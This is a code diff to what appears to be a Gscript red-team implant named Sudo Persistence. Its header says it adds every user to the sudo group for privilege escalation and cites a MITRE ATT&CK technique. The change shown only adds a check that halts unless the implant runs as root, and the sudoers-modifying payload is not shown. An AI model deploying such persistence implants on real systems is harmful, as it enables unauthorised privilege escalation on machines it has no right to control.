@@ -4,13 +4,22 @@
 // Purpose: adds everyone to the sudo group so they can easily priv esc
 // Gscript version: 0.1.2
 // ATT&CK: https://attack.mitre.org/wiki/Technique/T1169
+// Note: must run implant as root
 
 //priority:100
 //timeout:150
 
 function BeforeDeploy() {
   LogInfo("starting execution of Sudo Persistence");
-  // need to make sure we are running as root
+  var well = GetUser();
+  LogInfo("Our user is: "+well.username);
+  if (well.username == "root") {
+    return true;
+  } else {
+    LogInfo("Detected a non-root user, this needs to run as root!");
+    Halt();
+    return false;
+  }
   return true; 
 }
 
